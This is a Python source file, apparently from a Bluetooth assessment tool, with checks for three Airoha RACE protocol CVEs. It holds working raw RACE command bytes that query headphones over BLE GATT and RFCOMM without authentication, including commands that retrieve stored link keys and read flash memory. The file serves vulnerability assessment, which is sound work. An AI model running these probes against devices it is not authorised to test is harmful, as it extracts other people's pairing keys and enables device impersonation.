"""Confirmed OTA checks for Airoha RACE protocol CVEs.

These checks avoid surface-only reporting. A finding is emitted only when the
target returns a valid, attacker-observable RACE response or accepts an
unauthenticated BR/EDR RFCOMM session on a positively identified Airoha target.
"""

from __future__ import annotations

import asyncio
import socket

from blue_tap.modules.assessment.cve_framework import make_cve_finding as _finding


_RACE_UUID_VARIANTS = {
    "airoha": {
        "service": "5052494d-2dab-0341-6972-6f6861424c45",
        "tx": "43484152-2dab-3241-6972-6f6861424c45",
        "rx": "43484152-2dab-3141-6972-6f6861424c45",
    },
    "sony": {
        "service": "dc405470-a351-4a59-97d8-2e2e3b207fbb",
        "tx": "bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead",
        "rx": "2a6b6575-faf6-418c-923f-ccd63a56d955",
    },
}

RACE_SDK_VERSION_CMD = bytes([0x05, 0x5A, 0x02, 0x00, 0x01, 0x03])
RACE_GET_LINK_KEY = bytes([0x05, 0x5A, 0x02, 0x00, 0xC0, 0x0C])
RACE_FLASH_READ = bytes([0x05, 0x5A, 0x07, 0x00, 0x03, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x08])

_AIROHA_CACHE: dict[str, dict] = {}


def _run_async(coro):
    """Run async code from the synchronous scanner."""
    try:
        asyncio.get_running_loop()
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
            return pool.submit(asyncio.run, coro).result()
    except RuntimeError:
        return asyncio.run(coro)


def _normalize_uuid(value: str) -> str:
    return str(value).lower()


def _parse_race_response(data: bytes) -> dict | None:
    """Parse a RACE response frame into a minimal structured dict."""
    if len(data) < 6 or data[0] != 0x05 or data[1] != 0x5B:
        return None
    length = int.from_bytes(data[2:4], "little")
    cmd_id = int.from_bytes(data[4:6], "little")
    payload = data[6:]
    if length < 2 or len(payload) < max(0, length - 2):
        return None
    return {
        "cmd_id": cmd_id,
        "length": length,
        "payload": payload,
        "raw": data,
    }


async def _probe_race_command(address: str, payload: bytes, *, timeout: float = 3.0) -> dict:
    """Connect over BLE, confirm a known RACE service variant, and send one command."""
    try:
        from bleak import BleakClient
    except ImportError:
        return {"state": "error", "reason": "bleak not installed"}

    response_holder: list[bytes] = []
    response_event = asyncio.Event()

    def _notification_handler(_sender, data: bytes):
        response_holder.append(bytes(data))
        response_event.set()

    try:
        async with BleakClient(address, timeout=10) as client:
            services = await client.get_services()
            service_uuids = {_normalize_uuid(svc.uuid) for svc in services}

            variant_name = None
            variant = None
            for candidate_name, candidate in _RACE_UUID_VARIANTS.items():
                if _normalize_uuid(candidate["service"]) in service_uuids:
                    variant_name = candidate_name
                    variant = candidate
                    break

            if variant is None:
                return {"state": "not_applicable"}

            try:
                await client.start_notify(variant["rx"], _notification_handler)
            except Exception as exc:
                return {"state": "inconclusive", "reason": f"notify failed: {exc}", "variant": variant_name}

            try:
                await client.write_gatt_char(variant["tx"], payload, response=True)
            except Exception as exc:
                return {"state": "inconclusive", "reason": f"write failed: {exc}", "variant": variant_name}

            try:
                await asyncio.wait_for(response_event.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                return {"state": "inconclusive", "reason": "no RACE notification received", "variant": variant_name}

            parsed = _parse_race_response(response_holder[0]) if response_holder else None
            if parsed is None:
                return {
                    "state": "inconclusive",
                    "reason": "received notification but payload was not a valid RACE response",
                    "variant": variant_name,
                }
            parsed["state"] = "confirmed"
            parsed["variant"] = variant_name
            return parsed
    except Exception as exc:
        return {"state": "inconclusive", "reason": f"BLE probe failed: {exc}"}


def _get_cached_context(address: str) -> dict:
    return _AIROHA_CACHE.setdefault(address, {})


def _known_airoha_candidate(address: str) -> bool:
    ctx = _get_cached_context(address)
    return bool(ctx.get("race_variant") or ctx.get("gatt_confirmed"))


def _check_airoha_race_gatt(address: str) -> list[dict]:
    """CVE-2025-20700: require a valid unauthenticated RACE BLE response."""
    result = _run_async(_probe_race_command(address, RACE_SDK_VERSION_CMD))
    ctx = _get_cached_context(address)

    if result["state"] == "not_applicable":
        return [_finding(
            "INFO", "CVE-2025-20700: Not Applicable",
            "Airoha RACE GATT authentication bypass check skipped — no recognized RACE "
            "service UUID variant was found in BLE service discovery.",
            cve="CVE-2025-20700", status="not_applicable", confidence="high",
            evidence="No standard Airoha/Sony RACE GATT service UUID found",
        )]

    if result["state"] != "confirmed":
        variant = result.get("variant")
        if variant:
            ctx["race_variant"] = variant
        return [_finding(
            "MEDIUM", "CVE-2025-20700: Inconclusive",
            "Airoha RACE-like GATT service was reachable, but Blue-Tap did not receive a "
            "valid unauthenticated RACE response to the SDK version command.",
            cve="CVE-2025-20700", status="inconclusive", confidence="medium",
            evidence=result.get("reason", "RACE probe did not yield a valid response"),
        )]

    if result["cmd_id"] != 0x0301:
        ctx["race_variant"] = result["variant"]
        return [_finding(
            "MEDIUM", "CVE-2025-20700: Inconclusive",
            "Target returned a RACE-like BLE response, but not to the expected SDK-version "
            "command identifier used for the authentication-bypass check.",
            cve="CVE-2025-20700", status="inconclusive", confidence="medium",
            evidence=f"Expected cmd_id=0x0301, got 0x{result['cmd_id']:04X}",
        )]

    ctx["race_variant"] = result["variant"]
    ctx["gatt_confirmed"] = True
    ctx["sdk_info_response"] = result["raw"]

    return [_finding(
        "CRITICAL",
        "Airoha RACE Protocol GATT Authentication Bypass (CVE-2025-20700)",
        "Target returned a valid RACE response to an unauthenticated BLE GATT command. "
        "This confirms that the RACE control plane is reachable without pairing or bonding.",
        cve="CVE-2025-20700",
        impact="Unauthenticated factory/debug protocol access over BLE",
        remediation="Update the device firmware to an Airoha SDK build that enforces BLE authentication.",
        status="confirmed",
        confidence="high",
        evidence=f"Variant={result['variant']}, cmd=0x0301, response_len={len(result['raw'])}",
    )]


def _check_airoha_race_bredr(address: str, services: list[dict]) -> list[dict]:
    """CVE-2025-20701: confirm unauthenticated RFCOMM acceptance on a known Airoha target."""
    if not _known_airoha_candidate(address):
        return [_finding(
            "INFO", "CVE-2025-20701: Not Applicable",
            "Airoha BR/EDR authentication-bypass check skipped — target was not positively "
            "identified as exposing Airoha RACE over BLE in this session.",
            cve="CVE-2025-20701", status="not_applicable", confidence="high",
            evidence="Run CVE-2025-20700 BLE RACE check first to identify an Airoha target",
        )]

    channel = None
    for svc in services:
        uuid = str(svc.get("uuid", "")).lower()
        if "111e" in uuid or "111f" in uuid or "1101" in uuid:
            ch = svc.get("channel") or svc.get("rfcomm_channel")
            if ch is None:
                continue
            try:
                channel = int(ch)
                break
            except (TypeError, ValueError):
                continue

    if channel is None:
        return [_finding(
            "INFO", "CVE-2025-20701: Not Applicable",
            "Airoha BR/EDR authentication-bypass check skipped — no RFCOMM-backed HFP/SPP "
            "channel was present in SDP records.",
            cve="CVE-2025-20701", status="not_applicable", confidence="high",
            evidence="No HFP/HSP/SPP RFCOMM channel discovered via SDP",
        )]

    AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
    BTPROTO_RFCOMM = getattr(socket, "BTPROTO_RFCOMM", 3)
    sock = None
    try:
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
        sock.settimeout(5.0)
        sock.connect((address, channel))
        try:
            sock.close()
        except Exception:
            pass
    except OSError as exc:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        return [_finding(
            "MEDIUM", "CVE-2025-20701: Inconclusive",
            "Known Airoha target did not cleanly accept the unauthenticated RFCOMM probe, "
            "or the local stack was denied before a definitive auth differential was observed.",
            cve="CVE-2025-20701", status="inconclusive", confidence="medium",
            evidence=f"RFCOMM channel {channel} connect failed: {exc}",
        )]
    except Exception as exc:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        return [_finding(
            "MEDIUM", "CVE-2025-20701: Inconclusive",
            "Unauthenticated RFCOMM probe did not complete cleanly on the identified Airoha target.",
            cve="CVE-2025-20701", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]

    _get_cached_context(address)["bredr_confirmed"] = True
    return [_finding(
        "CRITICAL",
        "Airoha RACE Protocol BR/EDR Authentication Bypass (CVE-2025-20701)",
        "Blue-Tap opened an RFCOMM channel on a positively identified Airoha target without "
        "any prior pairing or bond. This matches the documented unauthenticated BR/EDR path.",
        cve="CVE-2025-20701",
        impact="Unauthenticated profile access and potential RACE transport over BR/EDR",
        remediation="Update the device firmware to enforce BR/EDR authentication before RFCOMM service access.",
        status="confirmed",
        confidence="high",
        evidence=f"Unauthenticated RFCOMM connect succeeded on channel {channel}",
    )]


def _parse_link_key_response(parsed: dict) -> tuple[int, int] | None:
    """Return (num_devices, payload_len) for a valid link-key response."""
    if parsed["cmd_id"] != 0x0CC0:
        return None
    payload = parsed["payload"]
    if len(payload) < 3:
        return None
    num_devices = payload[1]
    records = payload[3:]
    if num_devices == 0:
        return (0, len(records))
    if len(records) != num_devices * 22:
        return None
    return (num_devices, len(records))


def _check_airoha_race_link_key(address: str) -> list[dict]:
    """CVE-2025-20702: require parsed link-key data or flash-read capability."""
    ctx = _get_cached_context(address)
    if not ctx.get("gatt_confirmed") and not ctx.get("bredr_confirmed"):
        return [_finding(
            "INFO", "CVE-2025-20702: Not Applicable",
            "RACE link-key extraction check skipped — no confirmed unauthenticated RACE "
            "transport was established first.",
            cve="CVE-2025-20702", status="not_applicable", confidence="high",
            evidence="Run CVE-2025-20700 or CVE-2025-20701 successfully first",
        )]

    link_key_result = _run_async(_probe_race_command(address, RACE_GET_LINK_KEY, timeout=5.0))
    if link_key_result["state"] == "confirmed":
        parsed = _parse_link_key_response(link_key_result)
        if parsed is not None:
            num_devices, _payload_len = parsed
            if num_devices > 0:
                return [_finding(
                    "CRITICAL",
                    "Airoha RACE Link Key Extraction (CVE-2025-20702)",
                    "Target returned structured BR/EDR link-key records over unauthenticated RACE.",
                    cve="CVE-2025-20702",
                    impact="Stored bonded-device link keys can be exfiltrated and reused for impersonation.",
                    remediation="Disable unauthenticated RACE access and remove link-key retrieval from production firmware.",
                    status="confirmed",
                    confidence="high",
                    evidence=f"RACE_GET_LINK_KEY returned {num_devices} record(s)",
                )]
            return [_finding(
                "MEDIUM", "CVE-2025-20702: Inconclusive",
                "Unauthenticated RACE transport is confirmed, but the target reported zero stored "
                "bond records for the link-key command.",
                cve="CVE-2025-20702", status="inconclusive", confidence="medium",
                evidence="RACE_GET_LINK_KEY returned zero bonded-device entries",
            )]

    flash_result = _run_async(_probe_race_command(address, RACE_FLASH_READ, timeout=5.0))
    if flash_result["state"] == "confirmed" and flash_result.get("cmd_id") == 0x0403:
        if flash_result["payload"]:
            return [_finding(
                "CRITICAL",
                "Airoha RACE Flash Read Capability (CVE-2025-20702)",
                "Target returned data for an unauthenticated RACE flash-read command. Even when "
                "direct link-key retrieval is disabled, stored keys remain recoverable from flash.",
                cve="CVE-2025-20702",
                impact="Read-only flash access can expose stored bond material and other sensitive state.",
                remediation="Disable unauthenticated RACE transport and remove production flash-read commands.",
                status="confirmed",
                confidence="high",
                evidence=f"RACE_STORAGE_PAGE_READ returned {len(flash_result['payload'])} bytes",
            )]

    reasons = []
    if link_key_result.get("reason"):
        reasons.append(f"link-key probe: {link_key_result['reason']}")
    if flash_result.get("reason"):
        reasons.append(f"flash-read probe: {flash_result['reason']}")
    evidence = "; ".join(reasons) if reasons else "RACE transport exists, but capability probes did not yield parsable key or flash data"
    return [_finding(
        "MEDIUM", "CVE-2025-20702: Inconclusive",
        "Unauthenticated RACE transport was established, but Blue-Tap did not obtain a definitive "
        "link-key or flash-read capability response from this firmware build.",
        cve="CVE-2025-20702", status="inconclusive", confidence="medium",
        evidence=evidence,
    )]


# ---------------------------------------------------------------------------
# Native Module classes
# ---------------------------------------------------------------------------

from typing import Any

from blue_tap.framework.module import Module, RunContext
from blue_tap.framework.module.options import OptAddress
from blue_tap.modules.assessment.base import CveCheckModule, ServiceDiscoveryMixin


class Cve202520700Module(CveCheckModule):
    """CVE-2025-20700: Airoha RACE BLE unauthenticated access."""

    module_id = "assessment.cve_2025_20700"
    name = "Airoha RACE GATT"
    description = "CVE-2025-20700: Airoha RACE GATT unauthenticated BLE access"
    protocols = ("BLE", "GATT")
    requires = ("ble_target",)
    destructive = False
    references = ("CVE-2025-20700",)
    options = (OptAddress("RHOST", required=True, description="Target BLE address"),)

    check_fn = staticmethod(_check_airoha_race_gatt)
    option_param_map = {"RHOST": "address"}


class Cve202520701Module(CveCheckModule, ServiceDiscoveryMixin):
    """CVE-2025-20701: Airoha RACE BR/EDR unauthenticated RFCOMM."""

    module_id = "assessment.cve_2025_20701"
    name = "Airoha RACE BR/EDR"
    description = "CVE-2025-20701: Airoha RACE BR/EDR unauthenticated RFCOMM access"
    protocols = ("Classic", "RFCOMM")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2025-20701",)
    options = (OptAddress("RHOST", required=True, description="Target BR/EDR address"),)

    check_fn = staticmethod(_check_airoha_race_bredr)

    def _execute_check(self, ctx: Any) -> list[dict]:
        """Execute check with service discovery."""
        target = ctx.options.get("RHOST", "")
        services = self._get_services(ctx)
        return _check_airoha_race_bredr(target, services)


class Cve202520702Module(CveCheckModule):
    """CVE-2025-20702: Airoha RACE link key extraction."""

    module_id = "assessment.cve_2025_20702"
    name = "Airoha RACE Link Key"
    description = "CVE-2025-20702: Airoha RACE link key extraction via flash read"
    protocols = ("Classic", "BLE")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2025-20702",)
    options = (OptAddress("RHOST", required=True, description="Target address"),)

    check_fn = staticmethod(_check_airoha_race_link_key)
    option_param_map = {"RHOST": "address"}
